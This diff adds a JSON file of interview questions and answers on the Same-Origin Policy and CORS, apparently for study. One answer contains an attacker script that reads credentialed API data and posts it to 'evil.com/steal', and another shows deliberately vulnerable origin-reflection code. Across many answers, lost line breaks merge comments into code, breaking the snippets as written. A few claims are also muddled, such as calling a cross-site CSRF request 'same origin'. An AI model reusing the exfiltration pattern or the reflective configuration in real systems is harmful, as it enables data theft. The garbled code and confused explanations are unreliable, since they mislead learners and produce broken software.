@@ -1,0 +1,182 @@
+{
+  "topicId": "cors-and-sop",
+  "name": "CORS and SOP",
+  "source": "CORS and SOP/CORS and Same-Origin Policy Interview Questions &.md",
+  "prompts": [
+    {
+      "id": "p7473266429ea7c",
+      "cluster": "Fundamental Questions",
+      "title": "What is the Same-Origin Policy (SOP) and why does it exist?",
+      "seconds": 120,
+      "answerMarkdown": "The Same-Origin Policy is a **browser security mechanism** that restricts how documents or scripts loaded from one origin can interact with resources from another origin.\n\n**An origin is defined by:**\n- **Scheme (Protocol)**: `http://` or `https://`\n- **Host (Domain)**: `example.com`\n- **Port**: `80` (HTTP) or `443` (HTTPS) - default ports are implicit\n\n**Why it exists:**\n1. **Prevents XSS attacks** - Malicious scripts cannot access data from other origins\n2. **Prevents cookie theft** - Cookies are origin-specific\n3. **Protects user privacy** - Prevents unauthorized data access\n4. **Security isolation** - Websites cannot interfere with each other\n\n**What it restricts:**\n- JavaScript access to DOM from different origins\n- AJAX/Fetch requests to different origins\n- Cookie access from different origins\n- LocalStorage/SessionStorage access from different origins\n\n**What it does NOT restrict:**\n- Embedding resources (images, scripts, stylesheets, iframes)\n- Form submissions to different origins\n- Redirects to different origins\n\n**Example:**\n\n```jsx\n// Same origin - ALLOWED// https://example.com/page1 accessing https://example.com/page2fetch('https://example.com/api/data')\n  .then(response => response.json());  // Works// Different origin - BLOCKED// https://example.com accessing https://api.example.comfetch('https://api.example.com/data')\n  .then(response => response.json());  // CORS error\n```\n\n---"
+    },
+    {
+      "id": "pd7eb6f2d7fc92e",
+      "cluster": "Fundamental Questions",
+      "title": "What is CORS and how does it relate to SOP?",
+      "seconds": 120,
+      "answerMarkdown": "CORS (Cross-Origin Resource Sharing) is a mechanism that allows web servers to specify which origins are permitted to access their resources, thereby **relaxing the Same-Origin Policy** in a controlled manner.\n\n**Key relationship:**\n- **SOP** = Default security mechanism (restricts cross-origin access)\n- **CORS** = Controlled relaxation (allows specific origins)\n\n**How CORS works:**\n1. Browser sends request with `Origin` header\n2. Server responds with CORS headers (e.g., `Access-Control-Allow-Origin`)\n3. Browser checks CORS headers\n4. If origin is allowed \u2192 Request proceeds\n5. If origin is not allowed \u2192 Request blocked\n\n**Important:**\n- CORS is **browser-enforced**, not server-protected\n- Direct requests (curl, Postman) **bypass CORS**\n- CORS only affects browser-based requests\n\n**Example:**\n\n```\n# Request\nGET /api/data HTTP/1.1\nHost: api.example.com\nOrigin: https://example.com\n\n# Response\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://example.com\nContent-Type: application/json\n\n{\"data\": \"value\"}\n```\n\n---"
+    },
+    {
+      "id": "p7c6abf262b6c18",
+      "cluster": "Fundamental Questions",
+      "title": "What are the components that define an origin?",
+      "seconds": 120,
+      "answerMarkdown": "An origin is defined by **three components**:\n\n1. **Scheme (Protocol)**: `http://` or `https://`\n2. **Host (Domain)**: `example.com`\n3. **Port**: `80` (HTTP) or `443` (HTTPS) - default ports are implicit\n\n**Same Origin Examples:**\n\n```\n\u2705 https://example.com/page1\n\u2705 https://example.com/page2\n\u2705 https://example.com:443/api\n// All same origin (port 443 is default for HTTPS)\n```\n\n**Different Origin Examples:**\n\n```\n\u274c http://example.com vs https://example.com\n   (Different protocol)\n\n\u274c example.com vs www.example.com\n   (Different host)\n\n\u274c https://example.com vs https://example.com:8080\n   (Different port)\n\n\u274c https://example.com vs https://api.example.com\n   (Different subdomain)\n```\n\n**Note:**\n- `www.google.com` and `google.com` are **different origins** (different hosts)\n- `http://google.com` and `https://google.com` are **different origins** (different protocols)\n\n---"
+    },
+    {
+      "id": "pb33324306917fe",
+      "cluster": "Fundamental Questions",
+      "title": "What is the difference between simple requests and preflight requests?",
+      "seconds": 120,
+      "answerMarkdown": "**Simple Requests:**\n- Sent directly without preflight check\n- Must meet specific criteria:\n- Method: GET, POST, or HEAD\n- Headers: Only simple headers (Accept, Accept-Language, Content-Language)\n- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`\n\n**Preflight Requests:**\n- Browser sends OPTIONS request first\n- Triggered when:\n- Custom headers (e.g., `X-Custom-Header`)\n- Non-simple methods (PUT, DELETE, PATCH)\n- Content-Type other than simple types (e.g., `application/json`)\n- Requests with credentials (in some cases)\n\n**Example Simple Request:**\n\n```jsx\n// Simple GET request - no preflightfetch('https://api.example.com/data')\n  .then(response => response.json());\n```\n\n**Example Preflight Request:**\n\n```jsx\n// Triggers preflight (custom header + JSON)fetch('https://api.example.com/data', {\n  method: 'POST',  headers: {\n    'Content-Type': 'application/json',    'X-Custom-Header': 'value'  },  body: JSON.stringify({key: 'value'})\n});// Flow:// 1. Browser sends OPTIONS (preflight)// 2. Server responds with CORS headers// 3. Browser checks response// 4. If allowed \u2192 Sends actual POST request// 5. If not allowed \u2192 Blocks request\n```\n\n---"
+    },
+    {
+      "id": "p2f1b4b3fe6bb57",
+      "cluster": "Fundamental Questions",
+      "title": "What are the main CORS headers and what do they do?",
+      "seconds": 150,
+      "answerMarkdown": "**Request Headers (Sent by Browser):**\n\n1. **Origin**\n\n    ```\n    Origin: https://example.com\n    ```\n\n    - Automatically set by browser\n    - Cannot be modified by JavaScript\n    - Indicates the origin of the requesting page\n2. **Access-Control-Request-Method**\n\n    ```\n    Access-Control-Request-Method: POST\n    ```\n\n    - Used in preflight requests\n    - Indicates the HTTP method of the actual request\n3. **Access-Control-Request-Headers**\n\n    ```\n    Access-Control-Request-Headers: X-Custom-Header, Content-Type\n    ```\n\n    - Used in preflight requests\n    - Lists custom headers that will be sent\n\n**Response Headers (Sent by Server):**\n\n1. **Access-Control-Allow-Origin**\n\n    ```\n    Access-Control-Allow-Origin: https://example.com\n    ```\n\n    - Most important CORS header\n    - Specifies which origin(s) can access the resource\n    - Can be specific origin or  (wildcard)\n2. **Access-Control-Allow-Methods**\n\n    ```\n    Access-Control-Allow-Methods: GET, POST, PUT, DELETE\n    ```\n\n    - Specifies which HTTP methods are allowed\n    - Used in preflight responses\n3. **Access-Control-Allow-Headers**\n\n    ```\n    Access-Control-Allow-Headers: Content-Type, Authorization\n    ```\n\n    - Specifies which request headers are allowed\n    - Used in preflight responses\n4. **Access-Control-Allow-Credentials**\n\n    ```\n    Access-Control-Allow-Credentials: true\n    ```\n\n    - Indicates whether credentials can be sent\n    - **Cannot use wildcard () with credentials**\n5. **Access-Control-Expose-Headers**\n\n    ```\n    Access-Control-Expose-Headers: X-Custom-Header\n    ```\n\n    - Specifies which response headers can be accessed by JavaScript\n6. **Access-Control-Max-Age**\n\n    ```\n    Access-Control-Max-Age: 86400\n    ```\n\n    - Specifies how long preflight results can be cached (in seconds)\n\n---"
+    },
+    {
+      "id": "pb77530b2d8fd55",
+      "cluster": "Scenario-Based Questions",
+      "title": "How would you configure CORS to allow a trusted third-party domain to access your API while ensuring security?",
+      "seconds": 120,
+      "answerMarkdown": "**Secure Configuration:**\n\n```jsx\nconst allowedOrigins = [\n  'https://trusted-partner.com',  'https://app.trusted-partner.com'];app.use((req, res, next) => {\n  const origin = req.headers.origin;  // Validate origin against whitelist  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');    res.setHeader('Access-Control-Max-Age', '86400');  }\n  // Handle preflight  if (req.method === 'OPTIONS') {\n    return res.sendStatus(200);  }\n  next();});\n```\n\n**Key Security Points:**\n1. **Whitelist specific origins** - Don't use wildcard\n2. **Validate Origin header** - Don't blindly reflect it\n3. **Limit methods and headers** - Only allow what's needed\n4. **Use credentials carefully** - Only if necessary\n5. **Handle preflight properly** - Validate preflight requests\n\n**Alternative (Using cors middleware):**\n\n```jsx\nconst cors = require('cors');const corsOptions = {\n  origin: (origin, callback) => {\n    const allowedOrigins = [\n      'https://trusted-partner.com',      'https://app.trusted-partner.com'    ];    if (!origin || allowedOrigins.includes(origin)) {\n      callback(null, true);    } else {\n      callback(new Error('Not allowed by CORS'));    }\n  },  credentials: true,  methods: ['GET', 'POST'],  allowedHeaders: ['Content-Type', 'Authorization'],  maxAge: 86400};app.use(cors(corsOptions));\n```\n\n---"
+    },
+    {
+      "id": "p8edb57e012096f",
+      "cluster": "Scenario-Based Questions",
+      "title": "A user reports that their application can\u2019t make requests to your API. How do you troubleshoot CORS issues?",
+      "seconds": 120,
+      "answerMarkdown": "**Troubleshooting Steps:**\n\n1. **Check Browser Console:**\n\n    ```jsx\n    // Look for CORS errors// \"No 'Access-Control-Allow-Origin' header\"// \"CORS policy blocked\"\n    ```\n\n2. **Check Request Headers:**\n\n    ```\n    # Verify Origin header is sent\n    Origin: https://example.com\n    ```\n\n3. **Check Response Headers:**\n\n    ```\n    # Verify CORS headers are present\n    Access-Control-Allow-Origin: https://example.com\n    Access-Control-Allow-Methods: GET, POST\n    ```\n\n4. **Test with curl:**\n\n    ```bash\n    # Test simple requestcurl -H \"Origin: https://example.com\" \\     -v https://api.example.com/data\n    # Test preflightcurl -X OPTIONS \\     -H \"Origin: https://example.com\" \\     -H \"Access-Control-Request-Method: POST\" \\     -v https://api.example.com/data\n    ```\n\n5. **Common Issues:**\n    - **Missing CORS headers** - Server not sending CORS headers\n    - **Origin mismatch** - Origin not in allowed list\n    - **Wildcard with credentials** - Invalid combination\n    - **Preflight not handled** - OPTIONS request not handled\n    - **Method/header not allowed** - Request uses disallowed method/header\n6. **Verify Configuration:**\n\n    ```jsx\n    // Check if origin is in allowed listconsole.log('Request Origin:', req.headers.origin);console.log('Allowed Origins:', allowedOrigins);console.log('Is Allowed:', allowedOrigins.includes(req.headers.origin));\n    ```\n\n7. **Check Browser DevTools:**\n    - Network tab \u2192 Check request/response headers\n    - Console tab \u2192 Check for CORS errors\n    - Application tab \u2192 Check CORS policy\n\n---"
+    },
+    {
+      "id": "p0d74cd9c14efad",
+      "cluster": "Scenario-Based Questions",
+      "title": "Your API needs to support both web and mobile apps. How do you configure CORS?",
+      "seconds": 120,
+      "answerMarkdown": "**Key Considerations:**\n- Web apps: Subject to CORS (browser-enforced)\n- Mobile apps: Not subject to CORS (direct HTTP requests)\n\n**Configuration:**\n\n```jsx\nconst allowedOrigins = [\n  'https://webapp.example.com',  'https://admin.example.com'];app.use((req, res, next) => {\n  const origin = req.headers.origin;  // CORS only applies to browser requests  // Mobile apps don't send Origin header (or send different one)  if (origin && allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');  }\n  // Mobile apps bypass CORS, so use API keys/tokens for authentication  // Web apps use CORS + cookies/tokens  if (req.method === 'OPTIONS') {\n    return res.sendStatus(200);  }\n  next();});\n```\n\n**Authentication Strategy:**\n- **Web apps**: CORS + cookies (with credentials)\n- **Mobile apps**: API keys or Bearer tokens (not subject to CORS)\n\n**Alternative Approach:**\n\n```jsx\n// Different endpoints for web vs mobileapp.use('/api/web/*', cors(corsOptions));  // CORS enabledapp.use('/api/mobile/*', authenticateMobile);  // API key auth\n```\n\n---"
+    },
+    {
+      "id": "pc31fcb1efb7d18",
+      "cluster": "Scenario-Based Questions",
+      "title": "You discover that your CORS configuration allows any origin. What are the security implications?",
+      "seconds": 120,
+      "answerMarkdown": "**Vulnerable Configuration:**\n\n```\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n**Security Implications:**\n\n1. **Any website can access your API:**\n\n    ```jsx\n    // Attacker's website: evil.comfetch('https://api.example.com/sensitive-data', {\n      credentials: 'include'})\n      .then(response => response.json())\n      .then(data => {\n        // Steal sensitive data    fetch('https://evil.com/steal', {\n          method: 'POST',      body: JSON.stringify(data)\n        });  });\n    ```\n\n2. **Credential exposure:**\n    - Cookies sent with requests\n    - Authentication tokens exposed\n    - Session hijacking possible\n3. **Data leakage:**\n    - Sensitive user data accessible\n    - API responses exposed\n    - Business logic revealed\n4. **CSRF attacks:**\n    - Easier to perform CSRF attacks\n    - Can bypass some CSRF protections\n\n**Note:** Browsers should reject `Access-Control-Allow-Origin: *` with credentials, but:\n- Some misconfigurations may still work\n- Direct requests (not browser) bypass this\n- Other vulnerabilities may exist\n\n**Fix:**\n\n```jsx\n// Use specific originsconst allowedOrigins = [\n  'https://example.com',  'https://app.example.com'];app.use((req, res, next) => {\n  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');  }\n  next();});\n```\n\n---"
+    },
+    {
+      "id": "pe03f63f497bf09",
+      "cluster": "Scenario-Based Questions",
+      "title": "How do you handle CORS for a development environment vs production?",
+      "seconds": 120,
+      "answerMarkdown": "**Configuration:**\n\n```jsx\nconst isDevelopment = process.env.NODE_ENV === 'development';const corsOptions = {\n  origin: (origin, callback) => {\n    if (isDevelopment) {\n      // Development: Allow localhost      if (!origin || origin.startsWith('http://localhost') || origin.startsWith('http://127.0.0.1')) {\n        callback(null, true);      } else {\n        callback(new Error('Not allowed in development'));      }\n    } else {\n      // Production: Strict origin list      const allowedOrigins = [\n        'https://example.com',        'https://app.example.com'      ];      if (allowedOrigins.includes(origin)) {\n        callback(null, true);      } else {\n        callback(new Error('Not allowed by CORS'));      }\n    }\n  },  credentials: true,  methods: ['GET', 'POST', 'PUT', 'DELETE'],  allowedHeaders: ['Content-Type', 'Authorization']\n};app.use(cors(corsOptions));\n```\n\n**Alternative (Environment-based):**\n\n```jsx\nconst corsConfig = {\n  development: {\n    origin: ['http://localhost:3000', 'http://localhost:3001'],    credentials: true  },  production: {\n    origin: ['https://example.com', 'https://app.example.com'],    credentials: true  }\n};const env = process.env.NODE_ENV || 'development';app.use(cors(corsConfig[env]));\n```\n\n**Best Practices:**\n- Use environment variables for configuration\n- Separate dev/prod CORS settings\n- Never use wildcard in production\n- Test CORS in both environments\n\n---"
+    },
+    {
+      "id": "p6b567ead91ee8f",
+      "cluster": "Implementation Questions",
+      "title": "How do you implement CORS in Node.js/Express?",
+      "seconds": 120,
+      "answerMarkdown": "**Option 1: Manual Implementation**\n\n```jsx\nconst express = require('express');const app = express();const allowedOrigins = [\n  'https://example.com',  'https://app.example.com'];// CORS middlewareapp.use((req, res, next) => {\n  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');    res.setHeader('Access-Control-Max-Age', '86400');  }\n  // Handle preflight  if (req.method === 'OPTIONS') {\n    return res.sendStatus(200);  }\n  next();});app.get('/api/data', (req, res) => {\n  res.json({ data: 'value' });});\n```\n\n**Option 2: Using cors middleware**\n\n```jsx\nconst express = require('express');const cors = require('cors');const app = express();const corsOptions = {\n  origin: (origin, callback) => {\n    const allowedOrigins = [\n      'https://example.com',      'https://app.example.com'    ];    if (!origin || allowedOrigins.includes(origin)) {\n      callback(null, true);    } else {\n      callback(new Error('Not allowed by CORS'));    }\n  },  credentials: true,  methods: ['GET', 'POST', 'PUT', 'DELETE'],  allowedHeaders: ['Content-Type', 'Authorization'],  maxAge: 86400};app.use(cors(corsOptions));app.get('/api/data', (req, res) => {\n  res.json({ data: 'value' });});\n```\n\n---"
+    },
+    {
+      "id": "pbb37e0b1e735d8",
+      "cluster": "Implementation Questions",
+      "title": "How do you test CORS configuration?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Manual Testing with curl:**\n\n```bash\n# Test simple requestcurl -H \"Origin: https://example.com\" \\     -v https://api.example.com/data\n# Test preflightcurl -X OPTIONS \\     -H \"Origin: https://example.com\" \\     -H \"Access-Control-Request-Method: POST\" \\     -H \"Access-Control-Request-Headers: Content-Type\" \\     -v https://api.example.com/data\n# Test with credentialscurl -H \"Origin: https://example.com\" \\     -H \"Cookie: sessionId=abc123\" \\     -v https://api.example.com/data\n```\n\n**2. Browser Testing:**\n\n```jsx\n// Test in browser consolefetch('https://api.example.com/data', {\n  credentials: 'include'})\n  .then(response => response.json())\n  .then(data => console.log(data))\n  .catch(error => console.error('CORS error:', error));\n```\n\n**3. Browser DevTools:**\n- Network tab \u2192 Check request/response headers\n- Console tab \u2192 Check for CORS errors\n- Application tab \u2192 Check CORS policy\n\n**4. Automated Tools:**\n\n```bash\n# CORScannergit clone https://github.com/chenjj/CORScanner\npython CORScanner.py -u https://api.example.com\n# Burp Suite# Intercept request \u2192 Modify Origin header \u2192 Check response# OWASP ZAP# Automated CORS scanning\n```\n\n**5. Test Cases:**\n- \u2705 Allowed origin should work\n- \u274c Disallowed origin should be blocked\n- \u2705 Preflight should be handled\n- \u274c Wildcard with credentials should be rejected\n- \u2705 Credentials should work with specific origin\n\n---"
+    },
+    {
+      "id": "p5a863827e1c454",
+      "cluster": "Security & Vulnerability Questions",
+      "title": "What is a CORS vulnerability and how can it be exploited?",
+      "seconds": 120,
+      "answerMarkdown": "**CORS Vulnerability:**\nA CORS vulnerability occurs when the server's CORS configuration is overly permissive or incorrectly validates the Origin header, allowing unauthorized origins to access resources.\n\n**Common Vulnerabilities:**\n\n1. **Origin Reflection Without Validation:**\n\n    ```jsx\n    // Vulnerable codeapp.use((req, res) => {\n      res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  res.setHeader('Access-Control-Allow-Credentials', 'true');});\n    ```\n\n    **Exploitation:**\n\n    ```bash\n    # Attacker sends request with malicious origincurl -H \"Origin: https://evil.com\" https://api.example.com/data\n    # Server reflects itAccess-Control-Allow-Origin: https://evil.com\n    Access-Control-Allow-Credentials: true\n    ```\n\n2. **Wildcard with Credentials:**\n\n    ```\n    Access-Control-Allow-Origin: *\n    Access-Control-Allow-Credentials: true\n    ```\n\n    - Browsers should reject, but misconfigurations may exist\n3. **Overly Permissive Origins:**\n\n    ```jsx\n    // Allows any subdomainif (origin && origin.endsWith('.example.com')) {\n      res.setHeader('Access-Control-Allow-Origin', origin);}\n    ```\n\n    - Attacker can register `evil.example.com`\n\n**Impact:**\n- Sensitive data exposure\n- Credential theft\n- CSRF attacks\n- Unauthorized API access\n\n---"
+    },
+    {
+      "id": "p6cd2ff72db3ab7",
+      "cluster": "Security & Vulnerability Questions",
+      "title": "How do you prevent CORS vulnerabilities?",
+      "seconds": 120,
+      "answerMarkdown": "**Best Practices:**\n\n1. **Whitelist Specific Origins:**\n\n    ```jsx\n    const allowedOrigins = [\n      'https://example.com',  'https://app.example.com'];if (allowedOrigins.includes(origin)) {\n      res.setHeader('Access-Control-Allow-Origin', origin);}\n    ```\n\n2. **Validate Origin Header:**\n\n    ```jsx\n    // Don't blindly reflect Origin// Always validate against whitelist\n    ```\n\n3. **Never Use Wildcard with Credentials:**\n\n    ```jsx\n    // \u274c WRONGAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: true// \u2705 CORRECTAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true\n    ```\n\n4. **Limit Methods and Headers:**\n\n    ```jsx\n    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');res.setHeader('Access-Control-Allow-Headers', 'Content-Type');\n    ```\n\n5. **Handle Preflight Properly:**\n\n    ```jsx\n    if (req.method === 'OPTIONS') {\n      // Validate preflight request  // Return appropriate CORS headers  return res.sendStatus(200);}\n    ```\n\n6. **Use Environment Variables:**\n\n    ```jsx\n    const allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');\n    ```\n\n7. **Regular Security Audits:**\n    - Test CORS configuration\n    - Use automated scanning tools\n    - Review origin whitelist regularly\n\n---"
+    },
+    {
+      "id": "p4bf99cdb05a74e",
+      "cluster": "Security & Vulnerability Questions",
+      "title": "Does CORS protect against CSRF attacks?",
+      "seconds": 120,
+      "answerMarkdown": "**No, CORS does NOT protect against CSRF attacks.**\n\n**Why:**\n- CORS only affects browser-enforced restrictions\n- CSRF attacks work by tricking the browser into making requests\n- If CORS allows the origin, the browser will send the request\n- CORS headers are sent by the server, not validated for CSRF protection\n\n**Example:**\n\n```jsx\n// CORS allows https://example.comAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true// Attacker's website: evil.com// User is logged into example.com// Attacker tricks user into visiting evil.com// CSRF attack still works:fetch('https://example.com/api/transfer', {\n  method: 'POST',  credentials: 'include',  body: JSON.stringify({to: 'attacker', amount: 1000})\n});// Browser sends request with cookies// CORS allows it (same origin)// CSRF attack succeeds\n```\n\n**What Actually Protects Against CSRF:**\n- CSRF tokens\n- SameSite cookie attribute\n- Custom headers (e.g., X-Requested-With)\n- Origin validation (but not CORS itself)\n\n**Important:**\n- CORS can actually make CSRF easier if misconfigured\n- Always use CSRF tokens in addition to CORS\n- Use SameSite cookie attribute\n\n---"
+    },
+    {
+      "id": "pf4c4d16e944e26",
+      "cluster": "Advanced Questions",
+      "title": "Explain the preflight request flow in detail.",
+      "seconds": 120,
+      "answerMarkdown": "**Preflight Request Flow:**\n\n1. **Browser detects non-simple request:**\n\n    ```jsx\n    fetch('https://api.example.com/data', {\n      method: 'PUT',  headers: {\n        'Content-Type': 'application/json',    'X-Custom-Header': 'value'  },  body: JSON.stringify({key: 'value'})\n    });\n    ```\n\n2. **Browser sends OPTIONS request (preflight):**\n\n    ```\n    OPTIONS /api/data HTTP/1.1\n    Host: api.example.com\n    Origin: https://example.com\n    Access-Control-Request-Method: PUT\n    Access-Control-Request-Headers: Content-Type, X-Custom-Header\n    ```\n\n3. **Server responds to preflight:**\n\n    ```\n    HTTP/1.1 200 OK\n    Access-Control-Allow-Origin: https://example.com\n    Access-Control-Allow-Methods: PUT\n    Access-Control-Allow-Headers: Content-Type, X-Custom-Header\n    Access-Control-Max-Age: 86400\n    ```\n\n4. **Browser checks preflight response:**\n    - If origin is allowed \u2192 Proceed\n    - If method is allowed \u2192 Proceed\n    - If headers are allowed \u2192 Proceed\n    - If any check fails \u2192 Block request\n5. **If preflight passes, browser sends actual request:**\n\n    ```\n    PUT /api/data HTTP/1.1\n    Host: api.example.com\n    Origin: https://example.com\n    Content-Type: application/json\n    X-Custom-Header: value\n\n    {\"key\": \"value\"}\n    ```\n\n6. **Server responds to actual request:**\n\n    ```\n    HTTP/1.1 200 OK\n    Access-Control-Allow-Origin: https://example.com\n    Content-Type: application/json\n\n    {\"success\": true}\n    ```\n\n**Important:**\n- Preflight is **automatic** (browser handles it)\n- You don't need to manually send OPTIONS requests\n- Preflight is a **browser optimization** to avoid sending unsafe requests\n- Preflight results can be **cached** (Access-Control-Max-Age)\n\n---"
+    },
+    {
+      "id": "p14bac42d388780",
+      "cluster": "Advanced Questions",
+      "title": "What happens if you don\u2019t handle preflight requests properly?",
+      "seconds": 120,
+      "answerMarkdown": "**Consequences:**\n\n1. **Requests Blocked:**\n\n    ```jsx\n    // Browser sends preflight// Server doesn't respond with CORS headers// Browser blocks the actual request// Error: \"CORS policy blocked\"\n    ```\n\n2. **Inconsistent Behavior:**\n    - Some requests work (simple requests)\n    - Some requests fail (non-simple requests)\n    - Difficult to debug\n3. **Security Issues:**\n    - If preflight is not validated, may allow unauthorized requests\n    - Overly permissive preflight responses\n\n**Proper Handling:**\n\n```jsx\n// Handle preflightif (req.method === 'OPTIONS') {\n  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');    res.setHeader('Access-Control-Max-Age', '86400');  }\n  return res.sendStatus(200);}\n```\n\n---"
+    },
+    {
+      "id": "pf423bd6a6a3b84",
+      "cluster": "Advanced Questions",
+      "title": "How does CORS work with credentials (cookies, authentication)?",
+      "seconds": 120,
+      "answerMarkdown": "**Enabling Credentials:**\n\n**Client-side:**\n\n```jsx\nfetch('https://api.example.com/data', {\n  credentials: 'include'  // Send cookies});\n```\n\n**Server-side:**\n\n```\nAccess-Control-Allow-Origin: https://example.com\nAccess-Control-Allow-Credentials: true\n```\n\n**Critical Rule:**\n- **Cannot use wildcard (`*`) with credentials**\n- Must specify exact origin\n\n**Example Flow:**\n\n```\n# Request\nGET /api/data HTTP/1.1\nHost: api.example.com\nOrigin: https://example.com\nCookie: sessionId=abc123\n\n# Response\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://example.com\nAccess-Control-Allow-Credentials: true\nSet-Cookie: sessionId=xyz789; HttpOnly; Secure; SameSite=None\n\n{\"data\": \"value\"}\n```\n\n**Important:**\n- Credentials include cookies, HTTP authentication, client certificates\n- When credentials are used, `Access-Control-Allow-Origin` cannot be `*`\n- Server must specify exact origin\n- Cookies may need `SameSite=None` for cross-origin requests\n\n---"
+    },
+    {
+      "id": "pff13366fa661b5",
+      "cluster": "Advanced Questions",
+      "title": "What is the difference between CORS and JSONP?",
+      "seconds": 120,
+      "answerMarkdown": "**CORS:**\n- Modern standard (W3C)\n- Supports all HTTP methods (GET, POST, PUT, DELETE, etc.)\n- Supports custom headers\n- Supports credentials\n- Server-controlled (secure)\n- Recommended approach\n\n**JSONP:**\n- Older technique (workaround)\n- Only supports GET requests\n- No custom headers\n- No credentials\n- Client-controlled (less secure)\n- Not recommended\n\n**JSONP Example:**\n\n```jsx\n// JSONP works by exploiting <script> tags// Scripts are not subject to SOP// Server returns:callback({\"data\": \"value\"});// Client:<script src=\"https://api.example.com/data?callback=handleData\"></script><script>function handleData(data) {\n  console.log(data);}\n</script>\n```\n\n**Why CORS is Better:**\n- More secure (server-controlled)\n- Supports all HTTP methods\n- Supports credentials\n- Standard approach\n- Better error handling\n\n---"
+    },
+    {
+      "id": "p646ef1495891c5",
+      "cluster": "Advanced Questions",
+      "title": "How do you implement CORS for multiple environments (dev, staging, production)?",
+      "seconds": 120,
+      "answerMarkdown": "**Configuration:**\n\n```jsx\nconst corsConfig = {\n  development: {\n    origin: [\n      'http://localhost:3000',      'http://localhost:3001',      'http://127.0.0.1:3000'    ],    credentials: true,    methods: ['GET', 'POST', 'PUT', 'DELETE'],    allowedHeaders: ['Content-Type', 'Authorization']\n  },  staging: {\n    origin: [\n      'https://staging.example.com',      'https://staging-app.example.com'    ],    credentials: true,    methods: ['GET', 'POST', 'PUT', 'DELETE'],    allowedHeaders: ['Content-Type', 'Authorization']\n  },  production: {\n    origin: [\n      'https://example.com',      'https://app.example.com'    ],    credentials: true,    methods: ['GET', 'POST', 'PUT', 'DELETE'],    allowedHeaders: ['Content-Type', 'Authorization']\n  }\n};const env = process.env.NODE_ENV || 'development';app.use(cors(corsConfig[env]));\n```\n\n**Using Environment Variables:**\n\n```jsx\n// .env fileALLOWED_ORIGINS_DEV=http://localhost:3000,http://localhost:3001ALLOWED_ORIGINS_STAGING=https://staging.example.comALLOWED_ORIGINS_PROD=https://example.com,https://app.example.com// Codeconst allowedOrigins = process.env[`ALLOWED_ORIGINS_${env.toUpperCase()}`]\n  .split(',')\n  .map(origin => origin.trim());app.use(cors({\n  origin: allowedOrigins,  credentials: true}));\n```\n\n---"
+    },
+    {
+      "id": "p1b507c9651766f",
+      "cluster": "Quick Reference Answers",
+      "title": "What is SOP?",
+      "seconds": 90,
+      "answerMarkdown": "Browser security mechanism that restricts cross-origin access."
+    },
+    {
+      "id": "p5448172498b151",
+      "cluster": "Quick Reference Answers",
+      "title": "What is CORS?",
+      "seconds": 90,
+      "answerMarkdown": "Mechanism that allows servers to specify which origins can access resources."
+    },
+    {
+      "id": "p05222f7f064f47",
+      "cluster": "Quick Reference Answers",
+      "title": "Does CORS protect your server?",
+      "seconds": 90,
+      "answerMarkdown": "No, CORS is browser-enforced. Direct requests bypass CORS."
+    },
+    {
+      "id": "pd4c17ad07eefac",
+      "cluster": "Quick Reference Answers",
+      "title": "Can you use wildcard with credentials?",
+      "seconds": 90,
+      "answerMarkdown": "No, browsers will reject `Access-Control-Allow-Origin: *` with credentials."
+    },
+    {
+      "id": "pad253e74f2a081",
+      "cluster": "Quick Reference Answers",
+      "title": "What triggers a preflight request?",
+      "seconds": 90,
+      "answerMarkdown": "Custom headers, non-simple methods, non-simple Content-Type, or credentials.\n\n---"
+    }
+  ]
+}
